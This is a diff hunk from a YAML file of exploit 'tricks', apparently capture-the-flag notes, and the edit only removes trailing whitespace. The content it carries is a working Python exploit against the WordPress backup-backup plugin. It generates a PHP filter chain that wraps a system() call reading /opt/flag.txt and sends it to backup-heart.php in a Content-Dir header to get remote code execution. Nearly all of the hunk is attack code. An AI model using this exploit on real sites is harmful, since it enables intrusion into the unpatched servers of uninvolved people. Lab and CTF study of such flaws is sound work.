@@ -34,11 +34,11 @@ tricks:
     how: "POST to backup-heart.php with Content-Dir header containing payload"
     payload: |
       result = subprocess.run(
-          ["python3", "php_filter_chain_generator.py", 
+          ["python3", "php_filter_chain_generator.py",
            "--chain", '<?php system("cat /opt/flag.txt"); ?>'],
           capture_output=True, text=True
       )
       payload = [l for l in result.stdout.split('\n') if l.startswith('php://')][0]
-      
+
       url = f"{TARGET}/wp-content/plugins/backup-backup/includes/backup-heart.php"
       resp = requests.post(url, headers={"Content-Dir": payload})
